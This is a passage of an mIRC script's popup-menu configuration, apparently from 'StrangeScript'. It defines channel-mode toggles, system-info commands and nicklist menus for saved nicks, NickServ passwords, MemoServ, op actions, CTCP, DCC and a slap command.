n516=.$iif(m isincs $chan(#).mode,$style(1)) Moderated:mode # $+($iif(m !isincs $chan(#).mode,+,-),m)
n517=.$iif(i isincs $chan(#).mode,$style(1)) Invite Only:mode # $+($iif(i !isincs $chan(#).mode,+,-),i)
n518=.$iif(p isincs $chan(#).mode,$style(1)) Private:mode # $+($iif(p !isincs $chan(#).mode,+,-),p)
n519=.$iif(s isincs $chan(#).mode,$style(1)) Secret:mode # $+($iif(s !isincs $chan(#).mode,+,-),s)
n520=.$iif(t isincs $chan(#).mode,$style(1)) Only Ops Set Topic:mode # $+($iif(t !isincs $chan(#).mode,+,-),t)
n521=.$iif(n isincs $chan(#).mode,$style(1)) Disable External Messages:mode # $+($iif(n !isincs $chan(#).mode,+,-),n)
n522=.$iif(l isincs $chan(#).mode,$style(1)) Channel Limit ( $+ $chan(#).limit $+ ):var %l = $??(Set Limit, Set Limit, $chan(#).limit) | mode # $iif(%l > 0,+l %l,-l) 
n523=.$iif(k isincs $chan(#).mode,$style(1)) Channel Password:var %k = $??(Channel Password, Channel Password, $chan(#).key) | mode # $iif(%k != $chan(#).key,+k %k,-k %k)
n524=.Topic:topic # $??(Change Topic, Topic, $chan(#).topic)
n525=System Info
n526=.System:sysinfo
n527=.Operating System:osinfo
n528=.Processor(s):cpuinfo
n529=.Memory:meminfo
n530=.Graphics:gfxinfo
n531=.Harddisks:diskinfo
n532=.Audio:audioinfo
n533=.Bandwidth:bw
n534=.Uptime:uptime
n535=$iif($song,Now Playing):np
n536=-
n537=Encoding
n538=.$submenu($encodingmenu($1),25)
n539=$iif($isfile($qt($window($active).logfile)), View Log):logview $qt($window($active).logfile)
n540=-
n541=Clear
n542=.Clear:clear
n543=.ClearAll:clearall
n544=Cycle
n545=.Cycle:cycle 
n546=.CycleAll:cycleall
n547=Search:search
n548=Close:close
n549=

[Nicklist]
n0=Saved Nicks
n1=.$chr(91) $key($network,saved.nick.1) $chr(93) $+ :
n2=..Use:/nick $key($network,saved.nick.1)
n3=..Display: $report($key($network,saved.nick.1),Password,$null,$null,$null,$null,$key($network,$key($network,saved.nick.1))).chan
n4=..Edit: keyedit $network saved.nick.1 "Saved nick 1"
n5=..Clear: keywrite $network saved.nick.1
n6=.$chr(91) $key($network,saved.nick.2) $chr(93) $+ :
n7=..Use:/nick $key($network,saved.nick.2)
n8=..Display: $report($key($network,saved.nick.2),Password,$null,$null,$null,$null,$key($network,$key($network,saved.nick.2))).chan
n9=..Edit: keyedit $network saved.nick.2 "Saved nick 2"
n10=..Clear: keywrite $network saved.nick.2Nick Password
n11=Nick Passwords
n12=.$key($network,saved.nick.1) $chr(91) $key($network,$key($network,saved.nick.1)) $chr(93) $+ :
n13=..Identify: { NickServ Identify $key($network,$me) }
n14=..Edit: keyedit $network $key($network,saved.nick.1) "New Nick Password"
n15=..Clear:{ keywrite $network $key($network,saved.nick.1) | $report(StrangeScript,$key($network,saved.nick.1),password,$null,Cleared).active }
n16=.$key($network,saved.nick.2) $chr(91) $key($network,$key($network,saved.nick.2)) $chr(93) $+ :
n17=..Identify: { NickServ Identify $key($network,saved.nick.2) }
n18=..Edit: keyedit $network $key($network,saved.nick.2) "New Nick Password"
n19=..Clear:{ keywrite $network $key($network,saved.nick.2) | $report(StrangeScript,$key($network,saved.nick.2),password,$null,Cleared).active }
n20=Auto Nick Recover $chr(91) $key($network,recover.nick) $chr(93) $+ :
n21=.On:{ keywrite $network recover.nick ON | $report(StrangeScript,Auto Nick Recover,$null,$null,Toggled to,$key($network,recover.nick)).active }
n22=.Off:{ keywrite $network recover.nick OFF | $report(StrangeScript,Auto Nick Recover,$null,$null,Toggled to,$key($network,recover.nick)).active }
n23=Do Nick Recover
n24=.Recover Nick $chr(91) $key($network,saved.nick.1) $chr(93) $+ :/recover $key($network,saved.nick.1)
n25=.Recover Nick $chr(91) $key($network,saved.nick.2) $chr(93) $+ :/recover $key($network,saved.nick.2)
n26=-
n27=MemoServ Menu
n28=.Send Menu
n29=..Send User:{ memoserv send $$?="Nick To Send To?" $$?="Message Your Sending" }
n30=..Send Chan: memoserv send # $$?="Message To Send To This Channel"
n31=..Send Sop:halt
n32=.Read Menu:
n33=..List All Memos:/memoserv list
n34=..List A Memo:/memoserv list $$?="NUM Of Memo To List?"
n35=..Read A Memo:/memoserv read $$?="NUM Of Memo To Read?"
n36=..Delete A Memo:/memoserv del $$?="NUM Of Memo To Delete?"
n37=..UnDelete A Memo:/memoserv undelete $$?="NUM Of Memo To UnDelete?"
n38=..Purge Deleted:/MemoServ purge
n39=-
n40=Query:query $$1
n41=Info
n42=.Whois:whois $$1 $1
n43=.Who:who $$1
n44=.Whowas:whowas $$1
n45=Op's
n46=.Kick:kick # $$1
n47=.Ban:ban $$1
n48=.Kick/Ban:ban -k $$1
n49=.-
n50=.$iif(a isin $nickmode,Give Sop,):sop $$1 $2 $3 $4 $5
n51=.$iif(a isin $nickmode,Take Sop,):desop $$1 $2 $3 $4 $5
n52=.-
n53=.$iif(o isin $nickmode,Give Op,):op $$1 $2 $3 $4 $5
n54=.$iif(o isin $nickmode,Take Op,):deop $$1 $2 $3 $4 $5
n55=.-
n56=.$iif(h isin $nickmode,Give Hop,):halfop $$1 $2 $3 $4 $5
n57=.$iif(h isin $nickmode,Take Hop,):dehalfop $$1 $2 $3 $4 $5
n58=.-
n59=.$iif(v isin $nickmode,Give Voice,):voice $$1 $2 $3 $4 $5
n60=.$iif(v isin $nickmode,Take Voice,):devoice $$1 $2 $3 $4 $5
n61=CTCP
n62=.Version:.ctcp $$1 version
n63=.Ping:.ctcp $$1 ping
n64=.Time:.ctcp $$1 time
n65=.Page:.ctcp $$1 page
n66=Notify
n67=.Add:notify $$1
n68=.Remove:notify -r $$1
n69=Ignore
n70=.Ignore:ignore $$1
n71=.Unignore:ignore -r $$1
n72=Invite
n73=.$submenu($invitemenu($1, $nick))
n74=DCC
n75=.Send:dcc send $$1
n76=.Chat:dcc chat $$1
n77=$iif($song,Now Playing):np $$1
n78=$iif(!$isfile(slaps.txt),SLAP!):slap $$1
n79=$iif($isfile(slaps.txt),SLAP!)
n80=.Random:slap $nick
n81=.$submenu($slapsmenu($1,$nick),25)
n82=